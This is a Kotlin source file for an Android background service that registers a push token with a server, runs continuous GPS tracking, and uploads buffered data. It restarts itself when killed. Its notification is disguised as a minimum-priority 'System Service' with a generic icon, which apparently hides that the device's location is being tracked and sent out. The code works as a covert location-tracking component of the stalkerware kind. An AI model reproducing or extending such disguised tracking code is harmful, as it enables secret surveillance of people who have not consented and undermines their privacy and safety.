package com.br.monitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.*
import org.json.JSONObject

class MainService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NotifIds.MAIN, buildNotif(), ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(NotifIds.MAIN, buildNotif())
        }

        // Register FCM token on first start
        FirebaseMessaging.getInstance().token.addOnSuccessListener { token ->
            scope.launch {
                ApiClient.post("/register", JSONObject().apply { put("fcm_token", token) })
            }
        }

        // Start continuous GPS
        startService(Intent(this, LocationService::class.java))

        // Periodic offline flush
        scope.launch {
            val buffer = OfflineBuffer(applicationContext)
            while (isActive) {
                delay(Config.OFFLINE_FLUSH_INTERVAL_MS)
                if (ApiClient.isOnline()) {
                    buffer.flush { type, payload ->
                        val json = runCatching { JSONObject(payload) }.getOrNull() ?: return@flush false
                        ApiClient.post("/$type", json)
                    }
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // restart if killed
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotif(): Notification {
        val ch = "main"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(
                NotificationChannel(ch, "Service", NotificationManager.IMPORTANCE_MIN)
            )
        }
        return NotificationCompat.Builder(this, ch)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.sym_def_app_icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }
}
